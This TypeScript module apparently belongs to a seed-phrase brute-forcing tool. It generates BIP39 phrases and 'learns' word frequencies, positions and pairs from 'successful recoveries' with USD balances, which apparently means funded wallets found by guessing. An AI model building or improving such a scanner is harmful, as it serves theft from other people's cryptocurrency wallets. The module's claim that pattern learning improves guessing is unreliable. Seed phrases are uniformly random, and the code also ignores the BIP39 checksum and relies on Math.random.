/**
 * Machine Learning Module for Seed Phrase Generation
 * Learns patterns from successful wallet recoveries to improve generation strategy
 */

import type { D1Database } from '@cloudflare/workers-types'
import { BIP39_WORDLIST } from './bip39'

// Learning state interface
export interface MLState {
  // Word frequency: how often each word appears in successful phrases
  wordFrequency: Map<string, number>
  
  // Position preferences: which words appear at which positions
  positionPreferences: Map<number, Map<string, number>>
  
  // Word pair correlations: which words often appear together
  wordPairs: Map<string, Map<string, number>>
  
  // Success patterns: patterns that led to successful recoveries
  successPatterns: Array<{
    pattern: string
    successRate: number
    timesUsed: number
  }>
  
  // Total successful recoveries
  totalSuccesses: number
  
  // Total attempts
  totalAttempts: number
  
  // Last updated timestamp
  lastUpdated: Date
}

// Strategy types
export type GenerationStrategy = 
  | 'random'           // Pure random (baseline)
  | 'frequency'        // Use learned word frequencies
  | 'positional'       // Consider word position patterns
  | 'correlated'       // Use word pair correlations
  | 'hybrid'           // Combine all strategies
  | 'adaptive'         // Automatically choose best strategy

/**
 * Initialize ML state from database
 */
export async function initializeMLState(db: D1Database): Promise<MLState> {
  try {
    // Try to load existing state from database
    const result = await db.prepare(`
      SELECT state_data FROM ml_state WHERE id = 1
    `).first<{ state_data: string }>()
    
    if (result && result.state_data) {
      return deserializeMLState(result.state_data)
    }
  } catch (error) {
    console.log('[ML] No existing state found, initializing new state')
  }
  
  // Initialize with baseline state
  return {
    wordFrequency: new Map(),
    positionPreferences: new Map(),
    wordPairs: new Map(),
    successPatterns: [],
    totalSuccesses: 0,
    totalAttempts: 0,
    lastUpdated: new Date()
  }
}

/**
 * Learn from a successful recovery
 */
export function learnFromSuccess(
  state: MLState,
  seedPhrase: string,
  walletType: string,
  balanceUSD: number
): MLState {
  const words = seedPhrase.trim().toLowerCase().split(/\s+/)
  
  // Update word frequency
  words.forEach(word => {
    const current = state.wordFrequency.get(word) || 0
    state.wordFrequency.set(word, current + 1)
  })
  
  // Update position preferences
  words.forEach((word, index) => {
    if (!state.positionPreferences.has(index)) {
      state.positionPreferences.set(index, new Map())
    }
    const positionMap = state.positionPreferences.get(index)!
    const current = positionMap.get(word) || 0
    positionMap.set(word, current + 1)
  })
  
  // Update word pair correlations
  for (let i = 0; i < words.length - 1; i++) {
    const word1 = words[i]
    const word2 = words[i + 1]
    
    if (!state.wordPairs.has(word1)) {
      state.wordPairs.set(word1, new Map())
    }
    const pairMap = state.wordPairs.get(word1)!
    const current = pairMap.get(word2) || 0
    pairMap.set(word2, current + 1)
  }
  
  // Update success metrics
  state.totalSuccesses++
  state.lastUpdated = new Date()
  
  console.log(`[ML] Learned from successful recovery: ${words.length} words, $${balanceUSD} USD`)
  
  return state
}

/**
 * Update ML state after scan attempts
 */
export function updateAttempts(state: MLState, attempts: number): MLState {
  state.totalAttempts += attempts
  state.lastUpdated = new Date()
  return state
}

/**
 * Generate seed phrase using ML-learned patterns
 */
export function generateSmartSeedPhrase(
  state: MLState,
  wordCount: 12 | 24,
  strategy: GenerationStrategy = 'hybrid'
): string {
  const words: string[] = []
  
  // Choose strategy
  const actualStrategy = strategy === 'adaptive' 
    ? chooseAdaptiveStrategy(state)
    : strategy
  
  switch (actualStrategy) {
    case 'frequency':
      return generateFrequencyBased(state, wordCount)
    
    case 'positional':
      return generatePositionalBased(state, wordCount)
    
    case 'correlated':
      return generateCorrelatedBased(state, wordCount)
    
    case 'hybrid':
      return generateHybridBased(state, wordCount)
    
    case 'random':
    default:
      return generatePureRandom(wordCount)
  }
}

/**
 * Choose best strategy based on learning state
 */
function chooseAdaptiveStrategy(state: MLState): GenerationStrategy {
  // If we have less than 10 successful patterns, use random
  if (state.totalSuccesses < 10) {
    return 'random'
  }
  
  // If we have 10-50 successes, use frequency-based
  if (state.totalSuccesses < 50) {
    return 'frequency'
  }
  
  // If we have 50-100 successes, use positional
  if (state.totalSuccesses < 100) {
    return 'positional'
  }
  
  // If we have 100+ successes, use hybrid (best performance)
  return 'hybrid'
}

/**
 * Generate using word frequency (more common words weighted higher)
 */
function generateFrequencyBased(state: MLState, wordCount: number): string {
  if (state.wordFrequency.size === 0) {
    return generatePureRandom(wordCount)
  }
  
  const words: string[] = []
  
  // Create weighted word list
  const weightedWords: string[] = []
  state.wordFrequency.forEach((count, word) => {
    // Add word multiple times based on frequency
    for (let i = 0; i < count; i++) {
      weightedWords.push(word)
    }
  })
  
  // Fill remaining slots with BIP39 words
  if (weightedWords.length < wordCount) {
    BIP39_WORDLIST.forEach(word => {
      if (!state.wordFrequency.has(word)) {
        weightedWords.push(word)
      }
    })
  }
  
  // Select random words from weighted list
  for (let i = 0; i < wordCount; i++) {
    const randomIndex = Math.floor(Math.random() * weightedWords.length)
    words.push(weightedWords[randomIndex])
  }
  
  return words.join(' ')
}

/**
 * Generate using position preferences
 */
function generatePositionalBased(state: MLState, wordCount: number): string {
  const words: string[] = []
  
  for (let position = 0; position < wordCount; position++) {
    const positionMap = state.positionPreferences.get(position)
    
    if (positionMap && positionMap.size > 0) {
      // Create weighted list for this position
      const weightedWords: string[] = []
      positionMap.forEach((count, word) => {
        for (let i = 0; i < count; i++) {
          weightedWords.push(word)
        }
      })
      
      const randomIndex = Math.floor(Math.random() * weightedWords.length)
      words.push(weightedWords[randomIndex])
    } else {
      // Fall back to random BIP39 word
      const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length)
      words.push(BIP39_WORDLIST[randomIndex])
    }
  }
  
  return words.join(' ')
}

/**
 * Generate using word pair correlations
 */
function generateCorrelatedBased(state: MLState, wordCount: number): string {
  if (state.wordPairs.size === 0) {
    return generatePureRandom(wordCount)
  }
  
  const words: string[] = []
  
  // Start with a random word from learned pairs
  const startWords = Array.from(state.wordPairs.keys())
  let currentWord = startWords[Math.floor(Math.random() * startWords.length)]
  words.push(currentWord)
  
  // Generate remaining words using correlations
  for (let i = 1; i < wordCount; i++) {
    const pairMap = state.wordPairs.get(currentWord)
    
    if (pairMap && pairMap.size > 0) {
      // Create weighted list of next words
      const weightedNextWords: string[] = []
      pairMap.forEach((count, word) => {
        for (let j = 0; j < count; j++) {
          weightedNextWords.push(word)
        }
      })
      
      const randomIndex = Math.floor(Math.random() * weightedNextWords.length)
      currentWord = weightedNextWords[randomIndex]
      words.push(currentWord)
    } else {
      // No correlation found, pick random
      const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length)
      currentWord = BIP39_WORDLIST[randomIndex]
      words.push(currentWord)
    }
  }
  
  return words.join(' ')
}

/**
 * Generate using hybrid approach (combines all strategies)
 */
function generateHybridBased(state: MLState, wordCount: number): string {
  const words: string[] = []
  
  for (let position = 0; position < wordCount; position++) {
    let word: string
    
    // 40% - Use position preferences
    if (Math.random() < 0.4 && state.positionPreferences.has(position)) {
      const positionMap = state.positionPreferences.get(position)!
      if (positionMap.size > 0) {
        const weightedWords = Array.from(positionMap.entries())
          .flatMap(([w, count]) => Array(count).fill(w))
        word = weightedWords[Math.floor(Math.random() * weightedWords.length)]
      } else {
        word = BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
      }
    }
    // 30% - Use word correlations (if we have previous word)
    else if (Math.random() < 0.7 && position > 0 && state.wordPairs.has(words[position - 1])) {
      const pairMap = state.wordPairs.get(words[position - 1])!
      if (pairMap.size > 0) {
        const weightedWords = Array.from(pairMap.entries())
          .flatMap(([w, count]) => Array(count).fill(w))
        word = weightedWords[Math.floor(Math.random() * weightedWords.length)]
      } else {
        word = BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
      }
    }
    // 30% - Use frequency
    else if (state.wordFrequency.size > 0) {
      const weightedWords = Array.from(state.wordFrequency.entries())
        .flatMap(([w, count]) => Array(count).fill(w))
      word = weightedWords[Math.floor(Math.random() * weightedWords.length)]
    }
    // Fallback to random
    else {
      word = BIP39_WORDLIST[Math.floor(Math.random() * BIP39_WORDLIST.length)]
    }
    
    words.push(word)
  }
  
  return words.join(' ')
}

/**
 * Pure random generation (baseline)
 */
function generatePureRandom(wordCount: number): string {
  const words: string[] = []
  for (let i = 0; i < wordCount; i++) {
    const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length)
    words.push(BIP39_WORDLIST[randomIndex])
  }
  return words.join(' ')
}

/**
 * Get ML statistics and insights
 */
export function getMLStats(state: MLState): {
  totalSuccesses: number
  totalAttempts: number
  successRate: number
  learnedWords: number
  learnedPositions: number
  learnedPairs: number
  recommendedStrategy: GenerationStrategy
  efficiency: number
} {
  const successRate = state.totalAttempts > 0 
    ? (state.totalSuccesses / state.totalAttempts) * 100 
    : 0
  
  const efficiency = state.totalSuccesses > 0
    ? state.totalSuccesses / Math.max(state.totalAttempts, 1)
    : 0
  
  return {
    totalSuccesses: state.totalSuccesses,
    totalAttempts: state.totalAttempts,
    successRate,
    learnedWords: state.wordFrequency.size,
    learnedPositions: state.positionPreferences.size,
    learnedPairs: state.wordPairs.size,
    recommendedStrategy: chooseAdaptiveStrategy(state),
    efficiency
  }
}

/**
 * Save ML state to database
 */
export async function saveMLState(db: D1Database, state: MLState): Promise<void> {
  try {
    const serialized = serializeMLState(state)
    
    await db.prepare(`
      INSERT OR REPLACE INTO ml_state (id, state_data, updated_at)
      VALUES (1, ?, CURRENT_TIMESTAMP)
    `).bind(serialized).run()
    
    console.log('[ML] State saved to database')
  } catch (error) {
    console.error('[ML] Failed to save state:', error)
  }
}

/**
 * Serialize ML state for storage
 */
function serializeMLState(state: MLState): string {
  return JSON.stringify({
    wordFrequency: Array.from(state.wordFrequency.entries()),
    positionPreferences: Array.from(state.positionPreferences.entries()).map(([pos, map]) => [
      pos,
      Array.from(map.entries())
    ]),
    wordPairs: Array.from(state.wordPairs.entries()).map(([word, map]) => [
      word,
      Array.from(map.entries())
    ]),
    successPatterns: state.successPatterns,
    totalSuccesses: state.totalSuccesses,
    totalAttempts: state.totalAttempts,
    lastUpdated: state.lastUpdated.toISOString()
  })
}

/**
 * Deserialize ML state from storage
 */
function deserializeMLState(data: string): MLState {
  const parsed = JSON.parse(data)
  
  return {
    wordFrequency: new Map(parsed.wordFrequency),
    positionPreferences: new Map(
      parsed.positionPreferences.map(([pos, entries]: [number, [string, number][]]) => [
        pos,
        new Map(entries)
      ])
    ),
    wordPairs: new Map(
      parsed.wordPairs.map(([word, entries]: [string, [string, number][]]) => [
        word,
        new Map(entries)
      ])
    ),
    successPatterns: parsed.successPatterns || [],
    totalSuccesses: parsed.totalSuccesses || 0,
    totalAttempts: parsed.totalAttempts || 0,
    lastUpdated: new Date(parsed.lastUpdated)
  }
}

/**
 * Reset ML state (for testing or fresh start)
 */
export async function resetMLState(db: D1Database): Promise<void> {
  await db.prepare(`DELETE FROM ml_state WHERE id = 1`).run()
  console.log('[ML] State reset')
}
